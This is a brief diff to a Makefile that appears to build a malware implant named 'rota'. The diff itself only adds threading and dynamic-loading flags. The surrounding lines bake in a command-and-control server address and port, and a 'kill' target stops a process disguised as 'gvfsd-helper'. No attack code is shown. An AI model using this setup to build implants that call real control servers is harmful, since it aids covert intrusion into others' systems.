@@ -1,5 +1,5 @@
 CC=gcc
-FLAGS=-ggdb -DDEBUG -Winfinite-recursion -Wall
+FLAGS=-ggdb -DDEBUG  -Wall -lpthread -pthread
 
 #update Makefile here
 C2_SERVER='"10.10.2.228"'
@@ -11,7 +11,7 @@ bins:
 	mkdir -p ./bin/
 
 compile: bins
-	$(CC) $(FLAGS) -DC2_SERVER=$(C2_SERVER) -DC2_PORT=$(C2_PORT) -I ./inc/ $(wildcard ./src/*.c) -o ./bin/rota
+	$(CC) $(FLAGS) -DC2_SERVER=$(C2_SERVER) -DC2_PORT=$(C2_PORT) -I ./inc/ $(wildcard ./src/*.c) -ldl -o ./bin/rota
 
 kill:
 	pkill gvfsd-helper
